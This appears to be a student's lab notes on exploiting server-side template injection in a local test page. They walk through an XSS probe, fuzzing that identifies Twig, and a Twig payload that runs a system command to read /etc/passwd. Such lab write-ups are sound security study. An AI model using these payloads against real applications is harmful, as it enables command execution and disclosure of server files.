
### **SSTI Lab 0x01 :**

-  **Let start by check if the page is vulnerable**.
	-  We can start by check this **DOM XSS payload** `<img src=x onerror="prompt()">`.
	- ![[ssti template injection 0x01.png]]
	- **Lets do some Fuzzing on the value in input box [Main idea of this is to find which template engine is being used]  .** : `can you burp or ffuf or tplmap`
		-  Here is the request once you **submit in ssti0x01 :**
			```http
			POST /ssti0x01.php HTTP/1.1
			Host: localhost:81
			User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
			Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
			Accept-Language: en-US,en;q=0.5
			Accept-Encoding: gzip, deflate, br
			Content-Type: application/x-www-form-urlencoded
			Content-Length: 20
			Origin: http://localhost:81
			Connection: keep-alive
			Referer: http://localhost:81/ssti0x01.php
			Upgrade-Insecure-Requests: 1
			Priority: u=0, i
			
			greeting=Hello+there
			```

		-  **Here :**
			- ![[ssti burp suite fuzzing.png]]
				-  Based of the error shown in the image, we can say that `Tig` template engine is being used.

		-  Since we are dealing with **Twig** we will use payload for Twig : [here](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#twig-php) 
			-  lets try this `{{7*7}}` : 
				-  ![[ssit twig payload 1.png]]
				-  In the image after submit `{{7*7}}`  it rendered the multiplied output that is `49`. 
					-  This also means that it is a **Server based TI**, since it directly displayed the output. instead of showing `{{7*7}} = 49`. you can verify it by inspecting it, and looking for 49.
					-  ![[ssit verification.png]]
			-  Lets try to get output for `/etc/passwd` : 
				-  `python {{['cat\x20/etc/passwd']|filter('system')}} `
					-  ![[reading etcpasswd in ssti.png]]
